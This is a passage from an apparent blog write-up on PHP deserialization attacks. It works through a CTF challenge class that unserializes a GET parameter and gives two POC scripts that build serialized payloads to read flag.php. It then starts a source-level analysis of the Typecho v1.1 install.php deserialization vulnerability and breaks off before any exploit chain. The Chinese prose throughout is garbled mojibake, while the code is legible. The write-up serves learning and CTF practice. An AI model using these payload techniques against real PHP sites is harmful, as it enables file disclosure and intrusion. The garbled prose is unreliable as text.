            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span></span></code></pre>

<p>ç®€å•åˆ†æè¯¥é¢˜åï¼Œå‘ç°éœ€è¦<font color=orange><code>GET</code></font>ä¼ é€’<font color=orange><code>str</code></font>å‚æ•°ï¼Œåœ¨è¯¥å‚æ•°ç¬¦åˆ<font color=orange><code>is_valid()</code></font>å‡½æ•°æ ¡éªŒåï¼Œå¯¹<font color=orange><code>str</code></font>ååºåˆ—åŒ–ã€‚</p>
<blockquote>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>é‚£ä¹ˆ<font color=orange><code>str</code></font>éœ€è¦ç¬¦åˆä»€ä¹ˆè¯·æ±‚å‘¢ï¼Ÿåœ¨<font color=orange><code>is_valid()</code></font>å‡½æ•°æ ¡éªŒä¸­ï¼Œè¦æ±‚<font color=orange><code>str</code></font>ä¸­çš„æ‰€æœ‰å­—ç¬¦ASCIIç éœ€è¦åœ¨32åˆ°125ä¹‹é—´</p>
</blockquote>
<p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ <font color=orange><code>str</code></font>å¹¶åˆ©ç”¨ï¼Œåœ¨æœ¬é¢˜ä¸­æœ‰ä¸¤ä¸ªé­”æœ¯æ–¹æ³•å­˜åœ¨ï¼šæ„é€ å‡½æ•°<font color=purple><code>__construct()</code></font>å’Œææ„å‡½æ•°<font color=purple><code>__destruct()</code></font>ï¼š</p>
<blockquote>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Hello World!"</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>åœ¨æ­¤ï¼Œå¯ä»¥åˆ©ç”¨ææ„å‡½æ•°ï¼Œåœ¨<font color=purple><code>__destruct()</code></font>ä¸­ï¼Œä¼šåˆ¤æ–­å¯¹è±¡çš„<font color=orange><code>op</code></font>å±æ€§æ˜¯å¦ç­‰äºâ€2â€ï¼ˆPHPä¸­çš„å¼ºç±»å‹åˆ¤æ–­ï¼Œä¼šåˆ¤æ–­å˜é‡çš„<font color=orange><code>type</code></font>æ˜¯å¦ä¹Ÿç›¸åŒï¼‰ï¼Œå¹¶ä¸”è¿›å…¥<font color=orange><code>process()</code></font>ä¸­</p>
</blockquote>
<p>å†æŸ¥çœ‹<font color=orange><code>process()</code></font>å‡½æ•°ï¼š</p>
<blockquote>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>åœ¨è¯¥å‡½æ•°ä¸­ï¼Œåˆ¤æ–­<font color=orange><code>op</code></font>å±æ€§æ˜¯å¦ç­‰äºâ€2â€ï¼ˆå¼±ç±»å‹åˆ¤æ–­ï¼Œå¹¶ä¸ä¼šåˆ¤æ–­å˜é‡<font color=orange><code>type</code></font>æ˜¯å¦ç›¸åŒï¼‰ï¼Œè‹¥ç­‰äºï¼Œåˆ™ç”¨<font color=orange><code>read()</code></font>å‡½æ•°è¯»å–æ–‡ä»¶åä¸º<font color=orange><code>filename</code></font>å±æ€§å€¼çš„æ–‡ä»¶å¹¶è¾“å‡º</p>
</blockquote>
<h4 id="2-2-POC"><a href="#2-2-POC" class="headerlink" title="2.2 POC"></a>2.2 POC</h4><p>é€šè¿‡ä¸Šé¢åˆ†æï¼Œæ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹å°±æ¸…æ™°äº†ï¼š</p>
<p>æ„é€ å­—ç¬¦ä¸²<font color=orange><code>str</code></font>ç»•è¿‡<font color=orange><code>is_valid()</code></font>å‡½æ•°çš„åˆ¤æ–­ï¼Œç„¶åè®¾ç½®<font color=orange><code>op</code></font>å±æ€§å€¼ç»•è¿‡<font color=purple><code>__destruct()</code></font>ä¸­å¯¹â€2â€å¼ºç±»å‹åˆ¤æ–­ï¼Œå°†<font color=orange><code>filename</code></font>è®¾ç½®ä¸ºæƒ³è¦è¯»å–çš„æ–‡ä»¶å</p>
<p>POC1ï¼šPHP7.1+ ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæœ¬åœ°åºåˆ—åŒ–çš„æ—¶å€™å°†å±æ€§æ”¹ä¸º <font color=orange><code>public</code></font>å¯è¿›è¡Œç»•è¿‡</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">FileHandler</span><span class="token punctuation">&#123;</span> 
    <span class="token keyword">public</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"hello!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>  
<span class="token variable">$poc1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$poc1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//strä¸º: O:11:"FileHandler":3:&#123;s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:6:"hello!";&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>POC2ï¼šä½¿ç”¨16è¿›åˆ¶çš„\00æ›¿æ¢ç©ºå­—èŠ‚ï¼Œé‡‡ç”¨å¤§å†™çš„Sä»¥æ”¯æŒ16è¿›åˆ¶çš„\00ï¼ˆå¥½åƒè¯´ç©ºæ ¼æ›¿æ¢ç©ºå­—èŠ‚ä¹Ÿå¯ä»¥ï¼Œä½†æˆ‘æ²¡æœ‰æˆåŠŸï¼‰</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">FileHandler</span><span class="token punctuation">&#123;</span> 
    <span class="token keyword">protected</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"hello!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>  
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">;</span>
<span class="token variable">$poc2</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$poc2</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">00</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\00'</span><span class="token punctuation">,</span><span class="token variable">$poc2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç”±äºprotectedå±æ€§åºåˆ—åŒ–ååŒ…å«ç©ºå­—èŠ‚ï¼Œå°†å…¶æ›¿æ¢ä¸ºå¯è§çš„"\00"</span>
<span class="token variable">$poc2</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'s'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'S'</span><span class="token punctuation">,</span><span class="token variable">$poc2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$poc2</span><span class="token punctuation">;</span>
<span class="token comment">//strä¸º: O:11:"FileHandler":3:&#123;S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:8:"flag.php";S:10:"\00*\00content";S:6:"hello!";&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>æœ€åè·å¾—flagï¼š</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430094650.png" alt="image-20210430094513449" loading="lazy"></p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430094643.png" alt="image-20210430094448956" loading="lazy"></p>
<h3 id="0x03-Typechoååºåˆ—åŒ–æ¼æ´å¤ç°"><a href="#0x03-Typechoååºåˆ—åŒ–æ¼æ´å¤ç°" class="headerlink" title="0x03 Typechoååºåˆ—åŒ–æ¼æ´å¤ç°"></a>0x03 Typechoååºåˆ—åŒ–æ¼æ´å¤ç°</h3><h4 id="3-1-æ¼æ´ç®€ä»‹"><a href="#3-1-æ¼æ´ç®€ä»‹" class="headerlink" title="3.1 æ¼æ´ç®€ä»‹"></a>3.1 æ¼æ´ç®€ä»‹</h4><p>Typechoåœ¨ç¨‹åºå®‰è£…åä¸ä¼šåˆ é™¤<font color=orange><code>install.php</code></font>ï¼Œåœ¨è¯¥é¡µé¢ä¸­å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</p>
<p>ç¨‹åºç‰ˆæœ¬ï¼š<a target="_blank" rel="noopener" href="https://github.com/typecho/typecho/releases">v1.1-15.5.12-beta</a></p>
<h4 id="3-2-æºç åˆ†æ"><a href="#3-2-æºç åˆ†æ" class="headerlink" title="3.2 æºç åˆ†æ"></a>3.2 æºç åˆ†æ</h4><p>åœ¨<font color=orange><code>install.php</code></font>çš„ç¬¬230è¡Œä¸­ï¼Œæ‰¾åˆ°ååºåˆ—åŒ–ç›¸å…³å†…å®¹ï¼šå°†getåˆ°çš„<font color=orange><code>__typecho_config</code></font>è¿›è¡Œbase64è§£ç åï¼Œå†ååºåˆ—åŒ–ï¼Œå°†ååºåˆ—åŒ–çš„ç»“æœæ”¾å…¥äº†<font color=orange><code>Typecho_Db</code></font>ç±»ä¸­</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span>Typecho_Cookie<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'__typecho_config'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Typecho_Cookie<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'__typecho_config'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Db</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'adapter'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addServer</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">READ</span> <span class="token operator">|</span> Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">WRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>æŸ¥çœ‹Typecho_Cookieçš„<font color=orange><code>get()</code></font>å‡½æ•°ï¼šä»<font color=orange><code>cookie</code></font>æˆ–è€…<font color=orange><code>POST</code></font>å‚æ•°ä¸­è·å–å€¼ï¼Œå› æ­¤ï¼Œå¯æ§çš„è¾“å…¥æºå¯ä»¥ä»æ­¤å‡ºå‘</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$_prefix</span> <span class="token punctuation">.</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$default</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$default</span> <span class="token punctuation">:</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>æŸ¥çœ‹<font color=orange><code>Typecho_Db</code></font>ç±»ï¼Œå…¶ä¸­çš„é­”æœ¯æ–¹æ³•æœ‰<font color=purple><code>__construct()</code></font>ï¼šåœ¨å˜é‡<font color=orange><code>$adapterName</code></font>çš„æ‹¼æ¥ä¸­ï¼Œå°†è¯¥å˜é‡ä½œä¸ºå­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥ï¼Œä¼šè§¦å‘<font color=purple><code>__toString()</code></font>é­”æœ¯æ–¹æ³•</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapterName</span><span class="token punctuation">,</span> <span class="token variable">$prefix</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'typecho_'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">/** è·å–é€‚é…å™¨åç§° */</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_adapterName</span> <span class="token operator">=</span> <span class="token variable">$adapterName</span><span class="token punctuation">;</span>

    <span class="token comment">/** æ•°æ®åº“é€‚é…å™¨ */</span>
    <span class="token variable">$adapterName</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Typecho_Db_Adapter_'</span> <span class="token punctuation">.</span> <span class="token variable">$adapterName</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$adapterName</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'isAvailable'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Db_Exception</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Adapter <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$adapterName</span><span class="token punctuation">&#125;</span></span> is not available"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_prefix</span> <span class="token operator">=</span> <span class="token variable">$prefix</span><span class="token punctuation">;</span>

